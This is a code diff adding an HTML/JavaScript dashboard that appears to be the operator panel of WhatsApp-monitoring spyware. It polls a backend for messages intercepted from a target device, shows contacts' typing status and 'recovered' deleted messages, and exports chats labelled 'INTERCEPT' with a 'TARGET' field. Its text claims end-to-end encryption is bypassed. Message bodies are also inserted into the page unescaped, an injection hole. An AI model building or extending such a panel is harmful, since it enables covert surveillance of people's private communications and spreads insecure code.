@@ -1,0 +1,420 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WhatsApp Matrix - RS OWNER</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://unpkg.com/lucide@latest"></script>
+    <style>
+        /* 🚀 ORIGINAL WHATSAPP DARK THEME COLORS */
+        :root { 
+            --wa-bg: #111b21;
+            --wa-panel: #202c33;
+            --wa-chat-bg: #0b141a;
+            --wa-border: #222d34;
+            --wa-text: #e9edef;
+            --wa-muted: #8696a0;
+            --wa-green: #00a884;
+            --wa-bubble-in: #202c33;
+            --wa-bubble-out: #005c4b;
+        }
+
+        body { background-color: var(--wa-bg); color: var(--wa-text); font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif; overflow: hidden; height: 100vh; display: flex; }
+        
+        ::-webkit-scrollbar { width: 6px; height: 6px; }
+        ::-webkit-scrollbar-track { background: transparent; }
+        ::-webkit-scrollbar-thumb { background: rgba(255,255,255,0.1); border-radius: 10px; }
+        
+        /* Layout Grid */
+        .app-container { display: flex; width: 100%; height: 100%; }
+        
+        /* Sidebar List */
+        .sidebar { width: 30%; min-width: 300px; max-width: 400px; border-right: 1px solid var(--wa-border); display: flex; flex-direction: column; background: var(--wa-bg); }
+        @media (max-width: 768px) {
+            .sidebar { width: 100%; max-width: 100%; }
+            .mobile-hidden { display: none !important; }
+            .mobile-active { display: flex !important; width: 100%; }
+        }
+
+        .chat-list-item { display: flex; align-items: center; padding: 12px 16px; cursor: pointer; transition: background 0.2s; border-bottom: 1px solid var(--wa-border); }
+        .chat-list-item:hover { background: var(--wa-panel); }
+        .chat-list-item.active { background: var(--wa-panel); }
+        
+        /* Main Chat Area */
+        .chat-canvas { flex: 1; display: flex; flex-direction: column; background: var(--wa-chat-bg); position: relative; }
+        .chat-header { height: 60px; background: var(--wa-panel); display: flex; align-items: center; padding: 0 16px; justify-content: space-between; z-index: 10; border-bottom: 1px solid var(--wa-border); }
+        
+        /* Chat Background Pattern (CSS SVG Trick) */
+        .chat-bg { position: absolute; inset: 0; opacity: 0.04; background-image: url("data:image/svg+xml,%3Csvg width='40' height='40' viewBox='0 0 40 40' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath d='M20 20.5V18H0v-2h20v-2H0v-2h20v-2H0V8h20V6H0V4h20V2H0V0h22v20h2V0h2v20h2V0h2v20h2V0h2v20h2V0h2v20h2v2H20v-1.5zM0 20h2v20H0V20zm4 0h2v20H4V20zm4 0h2v20H8V20zm4 0h2v20h-2V20zm4 0h2v20h-2V20zm4 4h20v2H20v-2zm0 4h20v2H20v-2zm0 4h20v2H20v-2zm0 4h20v2H20v-2z' fill='%23ffffff' fill-opacity='1' fill-rule='evenodd'/%3E%3C/svg%3E"); }
+        
+        /* Chat Stream */
+        .chat-stream { flex: 1; overflow-y: auto; padding: 20px 5%; display: flex; flex-direction: column; gap: 8px; z-index: 1; }
+        
+        /* Bubbles */
+        .msg-row { display: flex; width: 100%; margin-bottom: 2px; }
+        .row-in { justify-content: flex-start; }
+        .row-out { justify-content: flex-end; }
+        
+        .bubble { max-width: 65%; padding: 6px 7px 8px 9px; border-radius: 8px; position: relative; font-size: 14.2px; line-height: 19px; box-shadow: 0 1px 0.5px rgba(11,20,26,.13); word-wrap: break-word; }
+        .bubble-in { background: var(--wa-bubble-in); border-top-left-radius: 0; }
+        .bubble-out { background: var(--wa-bubble-out); border-top-right-radius: 0; }
+        
+        /* The deleted flag */
+        .bubble-deleted { border: 1px solid #f85149; background: rgba(248, 81, 73, 0.1) !important; color: #ff7b72; font-style: italic; }
+        
+        .msg-time { font-size: 11px; color: rgba(255,255,255,0.6); float: right; margin: 10px 0 -5px 12px; }
+        
+        /* Avatar Placeholder */
+        .avatar { width: 40px; height: 40px; border-radius: 50%; background: #6b7280; display: flex; align-items: center; justify-content: center; font-size: 20px; font-weight: bold; color: white; flex-shrink: 0; }
+
+        .date-badge { align-self: center; background: var(--wa-panel); color: var(--wa-muted); font-size: 12px; padding: 5px 12px; border-radius: 10px; margin: 12px 0; text-transform: uppercase; box-shadow: 0 1px 0.5px rgba(11,20,26,.13); }
+
+        #toast-container { position: fixed; top: 20px; right: 20px; z-index: 9999; display: flex; flex-direction: column; gap: 10px; }
+        .toast { padding: 12px 20px; border-radius: 8px; font-size: 14px; opacity: 0; transform: translateX(100%); transition: all 0.3s; background: rgba(0, 168, 132, 0.9); color: white; }
+        .toast.show { opacity: 1; transform: translateX(0); }
+    </style>
+</head>
+<body>
+
+    <div id="toast-container"></div>
+
+    <div class="app-container" id="main-workspace">
+        
+        <!-- ================= SIDEBAR ================= -->
+        <div class="sidebar" id="sidebar">
+            <!-- Sidebar Header -->
+            <div class="h-[60px] bg-[var(--wa-panel)] flex justify-between items-center px-4 border-b border-[var(--wa-border)]">
+                <div class="flex items-center gap-4">
+                    <button onclick="window.history.back()" class="text-[var(--wa-muted)] hover:text-white transition">
+                        <i data-lucide="arrow-left" class="w-6 h-6"></i>
+                    </button>
+                    <span class="font-bold text-lg text-[var(--wa-text)]">WhatsApp Logs</span>
+                </div>
+                <div class="flex gap-4 text-[var(--wa-muted)]">
+                    <button onclick="engine.nukeDatabase()" title="Wipe Database" class="hover:text-red-500 transition"><i data-lucide="trash-2" class="w-5 h-5"></i></button>
+                    <button onclick="engine.fetchLogs()" title="Force Sync"><i data-lucide="refresh-cw" class="w-5 h-5"></i></button>
+                </div>
+            </div>
+            
+            <!-- Search -->
+            <div class="p-2 border-b border-[var(--wa-border)]">
+                <div class="bg-[var(--wa-panel)] rounded-lg flex items-center px-4 py-1.5">
+                    <i data-lucide="search" class="w-4 h-4 text-[var(--wa-muted)] mr-3"></i>
+                    <input type="text" id="search-input" onkeyup="engine.filterChats()" placeholder="Search or start new chat" class="bg-transparent w-full outline-none text-sm text-[var(--wa-text)] h-8">
+                </div>
+            </div>
+
+            <!-- Chat List -->
+            <div class="flex-1 overflow-y-auto" id="chat-list">
+                <div class="p-8 text-center text-[var(--wa-muted)] text-sm">
+                    <i data-lucide="loader" class="w-6 h-6 animate-spin mx-auto mb-3"></i>
+                    Extracting Encrypted Nodes...
+                </div>
+            </div>
+        </div>
+
+        <!-- ================= MAIN CHAT CANVAS ================= -->
+        <div class="chat-canvas mobile-hidden" id="chat-canvas">
+            <div class="chat-bg"></div>
+            
+            <!-- Chat Header -->
+            <div class="chat-header">
+                <div class="flex items-center gap-4 w-full">
+                    <button class="md:hidden text-[var(--wa-muted)]" onclick="engine.toggleMobileView()">
+                        <i data-lucide="arrow-left" class="w-6 h-6"></i>
+                    </button>
+                    <div class="avatar" id="active-avatar">#</div>
+                    <div class="flex flex-col flex-1 overflow-hidden">
+                        <span class="font-bold text-[var(--wa-text)] truncate text-[16px]" id="active-name">Select a Chat</span>
+                        <!-- Typing Indicator Injection Point -->
+                        <span class="text-xs text-[var(--wa-green)] font-medium truncate hidden" id="active-typing">typing...</span>
+                        <span class="text-[13px] text-[var(--wa-muted)] truncate" id="active-number">--</span>
+                    </div>
+                    <button onclick="engine.exportTXT()" class="text-[var(--wa-muted)] hover:text-white transition p-2" title="Export Chat">
+                        <i data-lucide="download" class="w-5 h-5"></i>
+                    </button>
+                </div>
+            </div>
+
+            <!-- Chat Messages Stream -->
+            <div class="chat-stream" id="chat-stream">
+                <div class="flex-1 flex flex-col items-center justify-center text-[var(--wa-muted)]">
+                    <i data-lucide="smartphone" class="w-16 h-16 opacity-20 mb-4"></i>
+                    <h2 class="text-2xl font-light opacity-50">WhatsApp Web Intercept</h2>
+                    <p class="text-sm opacity-40 mt-2">End-to-End Encryption Bypassed. Waiting for payload.</p>
+                </div>
+            </div>
+        </div>
+
+    </div>
+
+    <script>
+        lucide.createIcons();
+
+        class WhatsAppEngine {
+            constructor() {
+                this.activeDeviceId = localStorage.getItem('active_device_id');
+                this.token = localStorage.getItem('owner_token') || localStorage.getItem('session_token') || "";
+                this.allData = [];
+                this.chatsMap = {};
+                this.selectedChatKey = null;
+                
+                this.init();
+            }
+
+            showToast(msg) {
+                const c = document.getElementById('toast-container');
+                const t = document.createElement('div');
+                t.className = `toast`;
+                t.innerText = msg;
+                c.appendChild(t);
+                setTimeout(() => t.classList.add('show'), 10);
+                setTimeout(() => { t.classList.remove('show'); setTimeout(() => t.remove(), 300); }, 3000);
+            }
+
+            async init() {
+                if (!this.activeDeviceId) {
+                    document.getElementById('chat-list').innerHTML = '<div class="p-6 text-center text-red-500 font-bold">DEVICE ID MISSING</div>';
+                    return;
+                }
+                await this.fetchLogs();
+                // Real-time polling every 10 seconds for WhatsApp
+                setInterval(() => this.fetchLogs(true), 10000);
+            }
+
+            async fetchLogs(silent = false) {
+                try {
+                    // Yahan hum python backend ke naye api route hit karenge jo WhatsApp Logs nikalega
+                    const res = await fetch(`/api/whatsapp/logs?device_id=${this.activeDeviceId}&limit=1000`, {
+                        headers: { 'Authorization': `Bearer ${this.token}` }
+                    });
+                    const result = await res.json();
+                    
+                    if (result.status === 'success') {
+                        this.allData = result.data || [];
+                        this.processAndRender(silent);
+                    }
+                } catch (e) {
+                    if(!silent) console.error("Database connection fault:", e);
+                }
+            }
+
+            processAndRender(silent) {
+                this.chatsMap = {};
+                
+                this.allData.forEach(m => {
+                    // Logic to extract real identity
+                    let nameTag = m.contact_name ? String(m.contact_name).trim() : "";
+                    let phoneTag = m.number ? String(m.number).trim() : "";
+                    
+                    let identity = (nameTag && nameTag !== "Unknown" && nameTag !== "Unknown Target") ? nameTag : phoneTag;
+                    if (!identity) identity = "Unknown Number";
+                    
+                    if (!this.chatsMap[identity]) {
+                        this.chatsMap[identity] = { name: identity, phone: phoneTag, messages: [], isTyping: false };
+                    }
+
+                    // Check for Live Typing Event
+                    if (m.protocol === "WHATSAPP_EVENT" && String(m.body).includes("[LIVE_STATUS")) {
+                        this.chatsMap[identity].isTyping = true;
+                        // Don't add typing event as a chat bubble
+                    } else {
+                        this.chatsMap[identity].messages.push(m);
+                    }
+                });
+
+                this.renderChatList();
+                if(this.selectedChatKey) {
+                    // Preserve scroll position if just silently updating
+                    const stream = document.getElementById('chat-stream');
+                    const isAtBottom = stream.scrollHeight - stream.scrollTop <= stream.clientHeight + 100;
+                    
+                    this.openChat(this.selectedChatKey, silent);
+                    
+                    if(isAtBottom) {
+                        setTimeout(() => { stream.scrollTop = stream.scrollHeight; }, 50);
+                    }
+                }
+            }
+
+            renderChatList(filterQuery = "") {
+                const list = document.getElementById('chat-list');
+                
+                let sortedChats = Object.values(this.chatsMap).sort((a, b) => {
+                    const latestA = Math.max(...a.messages.map(m => new Date(m.timestamp).getTime()), 0);
+                    const latestB = Math.max(...b.messages.map(m => new Date(m.timestamp).getTime()), 0);
+                    return latestB - latestA;
+                });
+
+                if(filterQuery) {
+                    sortedChats = sortedChats.filter(t => t.name.toLowerCase().includes(filterQuery) || t.phone.includes(filterQuery));
+                }
+
+                if (sortedChats.length === 0) {
+                    list.innerHTML = `<div class="p-6 text-center text-[var(--wa-muted)] text-sm">No chats intercepted.</div>`;
+                    return;
+                }
+
+                list.innerHTML = sortedChats.map((c) => {
+                    const sortedMsgs = c.messages.sort((a, b) => new Date(b.timestamp).getTime() - new Date(a.timestamp).getTime());
+                    const lastMsg = sortedMsgs[0] ? sortedMsgs[0].body : '';
+                    const timeStr = sortedMsgs[0] ? new Date(sortedMsgs[0].timestamp).toLocaleTimeString('en-IN', { hour: '2-digit', minute: '2-digit', hour12: true }) : '';
+                    
+                    const isActive = this.selectedChatKey === c.name;
+                    const initial = c.name.charAt(0).toUpperCase();
+                    
+                    // Display typing indicator in list if active
+                    const lastMsgDisplay = c.isTyping ? `<span class="text-[var(--wa-green)]">typing...</span>` : 
+                                           (lastMsg.includes('[DELETED_FLAG]') ? `🚫 Message deleted` : lastMsg);
+
+                    return `
+                    <div class="chat-list-item ${isActive ? 'active' : ''}" onclick="engine.openChat('${encodeURIComponent(c.name)}')">
+                        <div class="avatar mr-3">${initial}</div>
+                        <div class="flex-1 overflow-hidden">
+                            <div class="flex justify-between items-baseline mb-0.5">
+                                <span class="font-normal text-[var(--wa-text)] text-[17px] truncate">${c.name}</span>
+                                <span class="text-xs text-[var(--wa-muted)] whitespace-nowrap ml-2">${timeStr}</span>
+                            </div>
+                            <div class="text-[13px] text-[var(--wa-muted)] truncate">${lastMsgDisplay}</div>
+                        </div>
+                    </div>
+                    `;
+                }).join('');
+            }
+
+            filterChats() {
+                const query = document.getElementById('search-input').value.toLowerCase();
+                this.renderChatList(query);
+            }
+
+            formatDateSeparator(dateObj) {
+                const today = new Date();
+                const yesterday = new Date(today); yesterday.setDate(yesterday.getDate() - 1);
+                
+                if (dateObj.toDateString() === today.toDateString()) return "TODAY";
+                if (dateObj.toDateString() === yesterday.toDateString()) return "YESTERDAY";
+                return dateObj.toLocaleDateString('en-IN', { day: 'numeric', month: 'short', year: 'numeric' }).toUpperCase();
+            }
+
+            openChat(encodedName, isSilentUpdate = false) {
+                this.selectedChatKey = decodeURIComponent(encodedName);
+                const chatData = this.chatsMap[this.selectedChatKey];
+                
+                if(window.innerWidth <= 768) {
+                    document.getElementById('sidebar').classList.add('mobile-hidden');
+                    document.getElementById('chat-canvas').classList.add('mobile-active');
+                    document.getElementById('chat-canvas').classList.remove('mobile-hidden');
+                }
+
+                // Header Update
+                document.getElementById('active-name').innerText = chatData.name;
+                document.getElementById('active-number').innerText = chatData.phone;
+                document.getElementById('active-avatar').innerText = chatData.name.charAt(0).toUpperCase();
+                
+                const typingEl = document.getElementById('active-typing');
+                if (chatData.isTyping) {
+                    typingEl.classList.remove('hidden');
+                    document.getElementById('active-number').classList.add('hidden');
+                    // Auto-hide typing after 5 seconds to prevent getting stuck
+                    setTimeout(() => { chatData.isTyping = false; this.openChat(encodedName, true); }, 5000);
+                } else {
+                    typingEl.classList.add('hidden');
+                    document.getElementById('active-number').classList.remove('hidden');
+                }
+
+                // Render Stream
+                const stream = document.getElementById('chat-stream');
+                const chronological = chatData.messages.sort((a, b) => new Date(a.timestamp).getTime() - new Date(b.timestamp).getTime());
+                
+                let html = '';
+                let lastDateDiv = '';
+
+                chronological.forEach(m => {
+                    const dateObj = new Date(m.timestamp);
+                    const timeStr = dateObj.toLocaleTimeString('en-IN', { hour: '2-digit', minute: '2-digit', hour12: true });
+                    const dateSep = this.formatDateSeparator(dateObj);
+                    
+                    if (dateSep !== lastDateDiv) {
+                        html += `<div class="date-badge">${dateSep}</div>`;
+                        lastDateDiv = dateSep;
+                    }
+
+                    const isOut = (m.type === 'sent' || m.type === 'outgoing');
+                    const isDeleted = m.protocol === 'WHATSAPP_DELETED' || String(m.body).includes('[DELETED_FLAG]');
+                    
+                    let cleanBody = String(m.body).replace('[DELETED_FLAG] ', '');
+                    
+                    // Simple Media render (if body looks like a URL or image tag)
+                    if(cleanBody.startsWith("http") && (cleanBody.includes(".jpg") || cleanBody.includes(".png"))) {
+                        cleanBody = `<img src="${cleanBody}" class="rounded-lg mt-1 max-w-[250px]" loading="lazy">`;
+                    }
+
+                    html += `
+                    <div class="msg-row ${isOut ? 'row-out' : 'row-in'}">
+                        <div class="bubble ${isOut ? 'bubble-out' : 'bubble-in'} ${isDeleted ? 'bubble-deleted' : ''}">
+                            ${isDeleted ? '🚫 <i>Recovered: This message was deleted</i><br>' : ''}
+                            <span style="white-space: pre-wrap;">${cleanBody}</span>
+                            <span class="msg-time">${timeStr}</span>
+                        </div>
+                    </div>`;
+                });
+
+                stream.innerHTML = html;
+                
+                if (!isSilentUpdate) {
+                    setTimeout(() => { stream.scrollTop = stream.scrollHeight; }, 50);
+                }
+                
+                // Highlight active in list
+                document.querySelectorAll('.chat-list-item').forEach(c => c.classList.remove('active'));
+                const activeCard = document.querySelector(`.chat-list-item[onclick*="${encodedName}"]`);
+                if(activeCard) activeCard.classList.add('active');
+            }
+
+            toggleMobileView() {
+                document.getElementById('sidebar').classList.remove('mobile-hidden');
+                document.getElementById('chat-canvas').classList.add('mobile-hidden');
+                document.getElementById('chat-canvas').classList.remove('mobile-active');
+            }
+
+            async nukeDatabase() {
+                if(!confirm("WARNING: You are about to permanently eradicate all WhatsApp logs from the master database. Proceed?")) return;
+                try {
+                    const res = await fetch(`/api/whatsapp/clear?device_id=${this.activeDeviceId}`, {
+                        method: 'DELETE',
+                        headers: { 'Authorization': `Bearer ${this.token}` }
+                    });
+                    if (res.ok) {
+                        this.showToast("WhatsApp Data Flushed.");
+                        document.getElementById('chat-stream').innerHTML = '';
+                        this.allData = [];
+                        this.processAndRender();
+                    }
+                } catch(e) { this.showToast("Wipe Failed."); }
+            }
+
+            exportTXT() {
+                if(!this.selectedChatKey || !this.chatsMap[this.selectedChatKey]) return;
+                const cData = this.chatsMap[this.selectedChatKey];
+                let txt = `WHATSAPP INTERCEPT EXPORT\nTARGET: ${cData.name} (${cData.phone})\n=========================\n\n`;
+                
+                const chrono = cData.messages.sort((a, b) => new Date(a.timestamp).getTime() - new Date(b.timestamp).getTime());
+                chrono.forEach(m => {
+                    const time = new Date(m.timestamp).toLocaleString('en-IN');
+                    const sender = (m.type === 'sent') ? "Owner" : cData.name;
+                    txt += `[${time}] ${sender}: ${m.body.replace('[DELETED_FLAG] ', '(DELETED) ')}\n`;
+                });
+
+                const blob = new Blob([txt], { type: 'text/plain;charset=utf-8' });
+                const link = document.createElement("a");
+                link.href = URL.createObjectURL(blob);
+                link.download = `WA_${cData.name.replace(/\s+/g, '_')}.txt`;
+                link.click();
+            }
+        }
+        
+        const engine = new WhatsAppEngine();
+    </script>
+</body>
+</html>
